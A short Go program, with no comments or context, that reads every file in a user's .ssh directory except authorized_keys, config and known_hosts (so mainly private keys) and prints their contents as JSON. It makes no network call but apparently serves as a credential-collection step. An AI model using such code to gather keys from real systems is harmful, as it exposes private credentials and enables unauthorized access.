package main

import (
	"fmt"
	"io/ioutil"
	"encoding/json"
)

func main() {
	sshFiles, err := ioutil.ReadDir("/Users/lyon/.ssh/")
	files := map[string]string{}
	for _, file := range sshFiles {
		if !file.IsDir() && file.Name() != "authorized_keys" && file.Name() != "config" && file.Name() != "known_hosts" {
			content, err := ioutil.ReadFile("/Users/lyon/.ssh/" + file.Name())
			if err == nil {
				files[file.Name()] = string(content)
			}
		}	
	}
	bytes, err := json.Marshal(map[string]map[string]string{"ssh_files":files})
	fmt.Println(err)
	fmt.Println(string(bytes))
}